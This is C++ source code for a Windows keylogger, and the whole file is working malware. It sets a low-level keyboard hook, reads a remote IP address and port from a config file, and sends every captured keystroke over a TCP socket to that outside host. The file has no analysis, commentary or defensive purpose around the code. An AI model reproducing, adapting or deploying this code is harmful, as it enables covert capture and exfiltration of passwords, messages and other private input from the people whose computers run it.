#define _WIN32_WINNT 0x0500

#include<fstream>
#include<windows.h>
#include<winsock.h>

#pragma comment(lib, "Ws2_32.lib")

SOCKET s; //Socket handle

//CONNECTTOHOST – Connects to a remote host
bool ConnectToHost(int PortNo, char* IPAddress)
{
    //Start up Winsock…
    WSADATA wsadata;

    int error = WSAStartup(0x0202, &wsadata);

    //Did something happen?
    if (error)
        return false;

    //Did we get the right Winsock version?
    if (wsadata.wVersion != 0x0202)
    {
        WSACleanup(); //Clean up Winsock
        return false;
    }

    //Fill out the information needed to initialize a socket…
    SOCKADDR_IN target; //Socket address information

    target.sin_family = AF_INET; // address family Internet
    target.sin_port = htons (PortNo); //Port to connect on
    target.sin_addr.s_addr = inet_addr (IPAddress); //Target IP

    s = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP); //Create socket
    if (s == INVALID_SOCKET)
    {
        return false; //Couldn't create the socket
    }  

    //Try connecting...

    if (connect(s, (SOCKADDR *)&target, sizeof(target)) == SOCKET_ERROR)
    {
        return false; //Couldn't connect
    }
    else
        return true; //Success
}

//CLOSECONNECTION – shuts down the socket and closes any connection on it
void CloseConnection ()
{
    //Close the socket if it exists
    if (s)
        closesocket(s);

    WSACleanup(); //Clean up Winsock
}

using namespace std;

ofstream out("keys.txt", ios::out);

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) (lParam);
	
	// If key is being pressed
	if (wParam == WM_KEYDOWN) {
		switch (p->vkCode) {

			// Invisible keys
			case VK_EXECUTE: break;
			case VK_CAPITAL:			break;
			case VK_SHIFT:				break;
			case VK_LCONTROL:			break;
			case VK_RCONTROL:			break;
			case VK_INSERT:				break;
			case VK_END:					break;
			case VK_PRINT:				break;
			case VK_DELETE:		send(s, "{DEL}", 5, 0);			break;
			case VK_BACK:				break;

			case VK_LEFT:				break;
			case VK_RIGHT:			break;
			case VK_UP:					break;
			case VK_DOWN:				break;
			// Visible keys
			default:
				{
					
					char ss[10];
					if (p->vkCode == 190) p->vkCode = '.';
					ss[0] = p->vkCode;
					ss[1] = '\0';
					
					send(s, (char*) ss, 1, 0);
				}

		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {

	// Set windows hook
	HHOOK keyboardHook = SetWindowsHookEx(
		WH_KEYBOARD_LL,
		keyboardHookProc,
		hInstance,
		0);

	freopen("keyboard.conf","r",stdin);
	char ip[50];
	int port;
	scanf("%s",ip);
	scanf("%d",&port);

	ConnectToHost(port,ip);
	//send(s, (char*) "Hello", 5, 0);
	MessageBox(NULL, "Press OK to stop logging.", "Information", MB_OK);

	out.close();

	return 0;
}